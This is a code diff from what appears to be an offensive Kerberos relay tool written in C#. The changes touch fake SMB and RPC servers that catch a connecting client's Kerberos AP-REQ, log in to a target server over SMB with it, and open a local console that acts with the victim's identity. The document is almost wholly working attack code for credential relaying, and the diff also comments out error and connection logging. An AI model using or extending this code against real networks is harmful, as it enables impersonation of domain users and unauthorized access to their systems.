@@ -12,11 +12,11 @@ using static System.Runtime.InteropServices.JavaScript.JSType;
 
 public class State
 {
-    public Socket SourceSocket { get; }
-    public Socket TargetSocket { get; }
+    public Socket SourceSocket { get; set; }
+    public Socket TargetSocket { get; set; }
     public byte[] Buffer { get; }
     public int numReads = 0;
-
+    public IAsyncResult ar;
     public bool isRelayed = false;
     public string ServerType = "";
     public State(Socket sourceSocket, Socket targetSocket)
@@ -25,13 +25,17 @@ public class State
         TargetSocket = targetSocket;
         Buffer = new byte[4096]; // Adjust buffer size as needed
     }
+    public State()
+    {
+        
+    }
 
 }
 class SMBCommandSocketConsole
 {
 
     public byte[] apreqBuffer;
-    public FakeSMBServer currSocketServer;
+    public FakeRPCServer currSocketServer;
     public  async Task Start(int port, State state, byte[] buffer)
     {
         // Define the IP address and port
@@ -41,37 +45,70 @@ class SMBCommandSocketConsole
         // Create a TcpListener
         TcpListener listener = new TcpListener(IPAddress.Any, port);
 
+
         try
         {
             // Start the listener
-            listener.Start();
-            Console.WriteLine("[*] SMB Console Server started on any:{0}. Waiting for connections...", port);
+            
+            
+            
+            SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
+            //bool success = false;
+            bool success = false;
+            bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
 
+            if (!isConnected)
+            {
+                Console.WriteLine("[-] Could not connect to [{0}:445]", Program.targetFQDN);
+
+            }
+
+            smbc.currSourceSocket = state.SourceSocket;
+            smbc.currDestSocket = state.TargetSocket;
+            //smbc.ServerType = State.ServerType;
+            smbc.currSocketServer = currSocketServer;
+            smbc.CallID = currSocketServer.CallID;
+            smbc.AssocGroup = currSocketServer.AssocGroup;
+            smbc.Login(Program.apreqBuffer, out success);
+            
+            Console.WriteLine("[*] SMB Login status: {0}", success);
+            if (!success)
+            {
+
+                Console.WriteLine("[-] SMB Login Error");
+                state.isRelayed = true;
+                return;
+            }
+            
+            listener.Start();
+            state.isRelayed = false;
+            Console.WriteLine("[*] ===> SMB Console Server started on [any:{0}]. Waiting for connections...<===", port);
             //while (true)
             {
                 // Accept a client socket
                 //Socket clientSocket = listener.AcceptTcpClientAsync(); // AcceptSocket(); //AcceptTcpClientAsync()
                 TcpClient clientSocket = await listener.AcceptTcpClientAsync();
-                
-                
-                Console.WriteLine("[*] SMB Console Server connected client:{0}", clientSocket.Client.RemoteEndPoint);
-                SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
+
+
+                Console.WriteLine("[*] SMB Console Server connected client: [{0}]", clientSocket.Client.RemoteEndPoint);
+                //SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
                 //smbc.curSocketServer =  currSocketServer;
                 KrbRelay.Clients.Smb smb2 = new Smb(clientSocket.Client);
-                //smbc.currSourceSocket = state.SourceSocket;
-                //smbc.currDestSocket = state.TargetSocket;
+                smbc.currSourceSocket = state.SourceSocket;
+                smb2.alreadyLoggedIn = true;
+                smbc.currDestSocket = state.TargetSocket;
                 //smbc.ServerType = State.ServerType;
-                smbc.curSocketServer = currSocketServer;
-                bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
+                smbc.currSocketServer = currSocketServer;
+                /*bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
                 if (!isConnected)
                 {
-                    Console.WriteLine("[-] Could not connect to {0}:445", Program.targetFQDN);
+                    Console.WriteLine("[-] Could not connect to [{0}:445]", Program.targetFQDN);
 
                 }
+                */
 
 
-
-                Console.WriteLine("[*] SMB relay Connected to: {0}:445", Program.targetFQDN);
+                Console.WriteLine("[*] SMB Console Server client [{0}] relay Connected to: [{1}:445]", clientSocket.Client.RemoteEndPoint, Program.targetFQDN);
                 //state.isRelayed = true;
                 //Task.Run(() => smb2.smbConnect(smbc));
                 Task.Run(() => smb2.smbConnect(smbc, buffer));
@@ -83,14 +120,17 @@ class SMBCommandSocketConsole
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"Error: {ex.Message}");
+            //Console.WriteLine($"SMBSocket Error: {ex.Message}");
+            //Console.WriteLine("Stack Trace: " + ex.StackTrace);
         }
         finally
         {
             listener.Stop();
+            Program.bgconsoleStartPort--;
         }
     }
 }
+
 public class FakeSMBServer
 {
     private Socket _listenerSocket;
@@ -221,7 +261,7 @@ public class FakeSMBServer
             // Create a unique key for this connection
             string clientKey = $"{clientSocket.RemoteEndPoint}-{Guid.NewGuid()}";
 
-            Console.WriteLine($"[*] FakeSMBServer:{_listenPort} -> Client connected [{clientSocket.RemoteEndPoint}] in {(Program.forwdardmode ? "FORWARD" : "RELAY")} mode.", _listenPort);
+            //Console.WriteLine($"[*] FakeSMBServer:{_listenPort} -> Client connected [{clientSocket.RemoteEndPoint}] in {(Program.forwdardmode ? "FORWARD" : "RELAY")} mode.", _listenPort);
 
             // Create a new connection to the target server
             Socket targetSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -275,18 +315,7 @@ public class FakeSMBServer
                     state.SourceSocket.Send(smb2NegotiateProtocolResponse, smb2NegotiateProtocolResponse.Length, SocketFlags.None);
                     l = state.SourceSocket.Receive(buffer);
                     //int ticketOffset = Helpers.PatternAt(buffer, new byte[] { 0x60, 0x82 }); // 0x6e, 0x82, 0x06
-                    buffer = buffer.Skip(4).ToArray();
-                    Program.apreqBuffer = Program.ExtractSecurityBlob(buffer);
-                    if (!(Program.apreqBuffer[0] == 0x60 && Program.apreqBuffer[1] == 0x82))
-                    {
-                        Console.WriteLine("[-] FakeSMBServer {0}: Could not find AP-REQ, maybe using NTLM?", state.SourceSocket.RemoteEndPoint);
-                        state.isRelayed = false;
-
-                        //CloseConnection(state);
-                        return;
-
-                    }
-                    Console.WriteLine("[*] FakeSMBServer {0}: Got AP-REQ for : {1}/{2}", state.SourceSocket.RemoteEndPoint, Program.service, Program.targetFQDN);
+                    Console.WriteLine("[*] FakeRPCServer {0}: Got AP-REQ for : {1}/{2}", state.SourceSocket.RemoteEndPoint, Program.service, Program.targetFQDN);
 
 
 
@@ -318,7 +347,7 @@ public class FakeSMBServer
                             smbc.currSourceSocket = state.SourceSocket;
                             smbc.currDestSocket = state.TargetSocket;
                             smbc.ServerType = ServerType;
-                            smbc.curSocketServer = this;
+                            //smbc.currSocketServer = this;
                             bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
                             if (!isConnected)
                             {
